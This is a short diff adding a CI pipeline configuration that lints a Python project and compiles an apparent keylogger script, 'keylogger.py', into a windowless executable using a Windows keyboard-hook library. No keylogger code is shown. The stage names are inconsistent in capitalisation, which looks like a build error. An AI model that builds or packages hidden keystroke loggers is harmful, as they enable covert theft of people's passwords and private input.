@@ -1,0 +1,19 @@
+image: "python:3.8"
+before_script:
+  - python --version
+  - pip install pyWinhook-1.6.2-cp38-cp38-win32.whl
+  - pip install -r requirements.txt
+
+stages:
+  - Static Analysis
+  - Compile executable
+
+pylint:
+  stage: Static Analysis
+  script:
+    - pylint -d C0301 src/*.py
+
+pyinstaller:
+  stage: Compile Executable
+  script:
+    - pyinstaller --noconsole keylogger.py
